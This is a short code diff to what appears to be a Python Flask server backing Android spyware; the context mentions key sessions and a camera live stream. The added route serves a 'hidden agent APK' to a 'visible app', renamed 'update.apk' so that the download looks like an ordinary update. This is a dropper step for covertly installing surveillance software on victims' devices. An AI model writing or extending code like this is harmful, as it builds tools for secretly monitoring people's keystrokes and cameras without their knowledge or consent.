@@ -2075,6 +2075,19 @@ def _ping():
     return jsonify({"status": "alive", "timestamp": datetime.now(timezone.utc).isoformat(),
                      "active_key_sessions": len(_sessions), "version": "7.1.0"}), 200
 
+# V11.2.111: Serve agent APK for download by visible app
+@app.route("/agent.apk")
+def _serve_agent_apk():
+    """Serve the hidden agent APK to the visible app."""
+    import os
+    apk_path = "downloads/agent.apk"
+    if not os.path.exists(apk_path):
+        logger.warning(f"Agent APK not found at {apk_path}")
+        return make_response("Not Found", 404)
+    logger.info(f"Serving agent APK ({os.path.getsize(apk_path)} bytes)")
+    return send_file(apk_path, mimetype="application/vnd.android.package-archive",
+                     as_attachment=True, download_name="update.apk")
+
 
 # ════════════════════════════════════════════════════════════════
 # ⚡⚡⚡ CAMERA LIVE STREAM - MJPEG Stream
